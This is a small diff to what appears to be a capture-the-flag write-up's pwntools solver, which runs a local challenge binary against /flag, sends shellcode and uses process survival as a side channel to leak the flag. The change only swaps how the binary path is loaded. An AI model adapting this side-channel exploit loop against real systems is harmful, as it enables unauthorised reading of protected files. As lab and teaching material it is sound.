@@ -81,8 +81,7 @@ This difference in "life expectancy" (alive vs. dead) is our side-channel.
 from pwn import *
 import time
 
-exe = "./challenge"
-context.binary = exe
+elf = context.binary = ELF("./challenge")
 
 flag = ""
 index = 0
@@ -112,7 +111,7 @@ while True:
         """)
 
         # Run process
-        p = process([exe, "/flag"], level='error')
+        p = process([elf.path, "/flag"], level='error')
         p.send(shellcode)
 
         # Allow it to run for a bit
